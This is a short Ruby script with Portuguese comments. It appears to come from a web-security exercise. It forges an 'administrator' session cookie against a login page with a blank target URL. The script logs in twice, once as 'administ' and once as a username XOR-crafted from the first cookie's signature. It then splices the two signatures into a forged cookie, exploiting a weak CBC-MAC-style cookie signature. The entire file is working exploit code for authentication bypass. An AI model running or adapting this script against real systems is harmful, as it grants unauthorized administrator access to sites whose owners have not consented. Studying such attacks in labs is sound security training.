require 'httparty'
require 'base64'
URL = "" # alvo
def login(username)
        res = HTTParty.post(URL+'login.php', body:{username: username, password: 'Password1'}, follow_redirects: false) #pag de login e parâmetros
        return res.headers["set-cookie"].split("=")[1]
end
cookie = login("administ") #1° parte do login desejado (8 bytes)
sign1 = Base64.decode64(cookie).split("--")[1]

def xor(str1,str2)
        ret = ""
        str1.split(//).each_with_index do |c, i|
                ret[i] = (str1[i].ord^str2[i].ord).chr
        end
        return ret
end

username2 = xor("rator\00\00\00", sign1) #2° parte do login desejado com \00 completando para dar 8 bytes
cookie2 = login(username2).gsub("%2B", "+")
sign2 = Base64.decode64(cookie2).split("--")[1]
puts Base64.encode64("administrator--#{sign2}")